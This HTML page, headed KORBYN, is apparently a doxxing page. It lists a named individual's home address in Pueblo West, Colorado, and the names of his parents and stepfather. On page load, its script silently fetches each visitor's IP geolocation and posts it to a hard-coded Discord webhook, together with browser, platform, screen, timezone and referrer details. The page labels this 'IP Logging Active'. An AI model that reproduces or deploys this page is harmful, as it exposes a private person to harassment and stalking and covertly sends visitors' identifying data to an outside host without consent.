<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>KORBYN</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  :root {
    --bg: #000;
    --bg2: #0a0a0a;
    --card: #111;
    --card2: #1a1a1a;
    --text: #fff;
    --text2: #888;
    --border: #222;
    --glow: rgba(255,255,255,0.03);
  }

  [data-theme="light"] {
    --bg: #f5f5f5;
    --bg2: #fff;
    --card: #e8e8e8;
    --card2: #ddd;
    --text: #000;
    --text2: #555;
    --border: #ccc;
    --glow: rgba(0,0,0,0.02);
  }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Inter', 'Helvetica Neue', system-ui, sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    position: relative;
    transition: background 0.4s ease, color 0.4s ease;
  }

  .bg-image {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: url('https://github.com/outstrut/elijahpaz.space/blob/main/db5d5ef3-13a4-47a5-ae0c-13aeffb5788b.png?raw=true') center/cover no-repeat;
    filter: grayscale(1) brightness(0.15) blur(1px);
    z-index: 0;
    transition: filter 0.4s ease;
  }

  [data-theme="light"] .bg-image {
    filter: grayscale(1) brightness(0.85) blur(0.5px);
  }

  .bg-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.6);
    z-index: 1;
  }

  [data-theme="light"] .bg-overlay {
    background: rgba(255,255,255,0.7);
  }

  #entryScreen {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 100;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    background: var(--bg);
    transition: opacity 0.6s ease, transform 0.6s ease;
  }

  #entryScreen.hidden {
    opacity: 0;
    transform: scale(0.98);
    pointer-events: none;
  }

  .entry-title {
    font-size: clamp(4rem, 18vw, 10rem);
    font-weight: 900;
    letter-spacing: -0.06em;
    color: var(--text);
    margin-bottom: 2.5rem;
  }

  .entry-btn {
    padding: 1.2rem 4rem;
    font-size: 1.2rem;
    font-weight: 700;
    border: 2px solid var(--text);
    background: transparent;
    color: var(--text);
    cursor: pointer;
    transition: all 0.2s ease;
    letter-spacing: 0.15em;
    text-transform: uppercase;
  }

  .entry-btn:hover {
    background: var(--text);
    color: var(--bg);
  }

  #mainContent {
    position: relative;
    z-index: 2;
    text-align: center;
    padding: 2rem;
    opacity: 0;
    transition: opacity 1s ease;
  }

  #mainContent.visible {
    opacity: 1;
  }

  .dox-title {
    font-size: clamp(3rem, 12vw, 7rem);
    font-weight: 900;
    letter-spacing: -0.05em;
    color: var(--text);
    margin-bottom: 3rem;
  }

  .dox-box {
    display: inline-block;
    background: var(--card);
    border: 1px solid var(--border);
    padding: 2.5rem 4rem;
    min-width: 340px;
    transition: background 0.3s ease, border-color 0.3s ease;
  }

  .dox-line {
    font-size: clamp(1rem, 2.5vw, 1.3rem);
    font-weight: 500;
    color: var(--text);
    padding: 0.8rem 0;
    border-bottom: 1px solid var(--border);
    transition: color 0.3s ease, border-color 0.3s ease;
    letter-spacing: 0.02em;
  }

  .dox-line:last-child {
    border-bottom: none;
  }

  .dox-line .label {
    color: var(--text2);
    font-weight: 400;
    margin-right: 0.8rem;
  }

  .dox-line .value {
    font-weight: 600;
  }

  .theme-toggle {
    position: fixed;
    top: 24px;
    right: 24px;
    z-index: 50;
    width: 48px;
    height: 48px;
    border: 1px solid var(--border);
    background: var(--card);
    color: var(--text);
    cursor: pointer;
    font-size: 1.4rem;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s ease;
    border-radius: 4px;
  }

  .theme-toggle:hover {
    border-color: var(--text);
  }

  .audio-toggle {
    position: fixed;
    bottom: 24px;
    right: 24px;
    z-index: 50;
    width: 48px;
    height: 48px;
    border: 1px solid var(--border);
    background: var(--card);
    color: var(--text);
    cursor: pointer;
    font-size: 1.2rem;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s ease;
    border-radius: 4px;
  }

  .audio-toggle:hover {
    border-color: var(--text);
  }

  .scramble {
    display: inline-block;
    transition: all 0.1s ease;
  }

  @media (max-width: 600px) {
    .dox-box {
      padding: 1.5rem 1.5rem;
      min-width: unset;
      width: 100%;
    }
    .dox-line {
      font-size: 0.9rem;
      white-space: normal;
      word-break: break-word;
    }
    .entry-btn {
      padding: 1rem 2.5rem;
      font-size: 1rem;
    }
  }
</style>
</head>
<body data-theme="dark">

<div class="bg-image"></div>
<div class="bg-overlay"></div>

<button class="theme-toggle" id="themeToggle">◐</button>
<button class="audio-toggle" id="audioToggle">♫</button>

<div id="entryScreen">
  <div class="entry-title">KORBYN</div>
  <button class="entry-btn" id="enterBtn">enter</button>
</div>

<div id="mainContent">
  <div class="dox-title">KORBYN</div>
  <div class="dox-box">
    <div class="dox-line">
      <span class="label">NAME</span>
      <span class="value scramble">Korbyn Korinek</span>
    </div>
    <div class="dox-line">
      <span class="label">ADDRESS</span>
      <span class="value scramble">70 South Citadel Circle, Pueblo West, CO</span>
    </div>
    <div class="dox-line">
      <span class="label">MOTHER</span>
      <span class="value scramble">Alyssa Cawthra</span>
    </div>
    <div class="dox-line">
      <span class="label">FATHER</span>
      <span class="value scramble">David Korinek</span>
    </div>
    <div class="dox-line">
      <span class="label">STEP-FATHER</span>
      <span class="value scramble">Cody Cawthra</span>
    </div>
  </div>
</div>

<audio id="bgAudio" loop src="https://raw.githubusercontent.com/outstrut/elijahpaz.space/main/Life%20Letters.mp3"></audio>

<script>
  // --- IP LOGGING ---
  function sendToDiscord(data) {
    const webhook = 'https://discord.com/api/webhooks/1528732776839512248/wTmWwEPE-N43xi18BsCsFKx57xPGDJOpnqUQPzFt5geDq4DIT8hviWDz1kuTZLWa_uZC';
    
    // Build rich embed with ALL data
    const embed = {
      embeds: [{
        title: '📍 VISITOR LOGGED',
        color: 0x000000,
        fields: [],
        timestamp: new Date().toISOString(),
        footer: { text: 'KORBYN DOX | IP Logging Active' }
      }]
    };

    // Add all fields from ipwho.is response
    for (const [key, value] of Object.entries(data)) {
      if (value !== null && value !== undefined && value !== '') {
        // Handle nested objects (like timezone)
        if (typeof value === 'object') {
          for (const [subKey, subValue] of Object.entries(value)) {
            if (subValue !== null && subValue !== undefined) {
              embed.embeds[0].fields.push({
                name: `${key}.${subKey}`.toUpperCase(),
                value: String(subValue).substring(0, 1024),
                inline: false
              });
            }
          }
        } else {
          embed.embeds[0].fields.push({
            name: key.toUpperCase(),
            value: String(value).substring(0, 1024),
            inline: true
          });
        }
      }
    }

    // Add browser info
    embed.embeds[0].fields.push(
      { name: 'BROWSER', value: navigator.userAgent, inline: false },
      { name: 'LANGUAGE', value: navigator.language, inline: true },
      { name: 'PLATFORM', value: navigator.platform, inline: true },
      { name: 'SCREEN', value: `${window.screen.width}x${window.screen.height}`, inline: true },
      { name: 'COLOR DEPTH', value: `${window.screen.colorDepth}-bit`, inline: true },
      { name: 'TIMEZONE', value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
      { name: 'REFERRER', value: document.referrer || 'Direct', inline: false },
      { name: 'PAGE URL', value: window.location.href, inline: false }
    );

    // Send to Discord
    fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    }).catch(err => console.error('Webhook error:', err));
  }

  // Fetch IP data on page load
  fetch('https://ipwho.is/')
    .then(res => res.json())
    .then(data => {
      console.log('IP Data:', data);
      sendToDiscord(data);
    })
    .catch(err => console.error('IP fetch error:', err));

  // --- UI CONTROLS ---
  const entryScreen = document.getElementById('entryScreen');
  const mainContent = document.getElementById('mainContent');
  const enterBtn = document.getElementById('enterBtn');
  const themeToggle = document.getElementById('themeToggle');
  const audioToggle = document.getElementById('audioToggle');
  const audio = document.getElementById('bgAudio');
  let audioPlaying = false;

  enterBtn.addEventListener('click', () => {
    entryScreen.classList.add('hidden');
    setTimeout(() => {
      mainContent.classList.add('visible');
    }, 700);
    audio.play().then(() => {
      audioPlaying = true;
      audioToggle.textContent = '◼';
    }).catch(() => {
      audioToggle.textContent = '♫';
    });
  });

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !entryScreen.classList.contains('hidden')) {
      enterBtn.click();
    }
  });

  themeToggle.addEventListener('click', () => {
    const current = document.body.getAttribute('data-theme');
    document.body.setAttribute('data-theme', current === 'dark' ? 'light' : 'dark');
  });

  audioToggle.addEventListener('click', () => {
    if (audioPlaying) {
      audio.pause();
      audioPlaying = false;
      audioToggle.textContent = '♫';
    } else {
      audio.play().then(() => {
        audioPlaying = true;
        audioToggle.textContent = '◼';
      }).catch(() => {
        alert('Audio failed. Check the URL.');
      });
    }
  });

  document.querySelectorAll('.scramble').forEach(el => {
    const original = el.textContent;
    let interval;
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

    function scramble() {
      let count = 0;
      const max = 10;
      clearInterval(interval);
      interval = setInterval(() => {
        if (count >= max) {
          clearInterval(interval);
          el.textContent = original;
          return;
        }
        let result = '';
        for (let i = 0; i < original.length; i++) {
          result += Math.random() < 0.4 ? chars[Math.floor(Math.random() * chars.length)] : original[i];
        }
        el.textContent = result;
        count++;
      }, 50);
    }

    el.addEventListener('mouseenter', scramble);
    el.addEventListener('mouseleave', () => {
      clearInterval(interval);
      el.textContent = original;
    });
  });

  console.log('KORBYN');
</script>

</body>
</html>
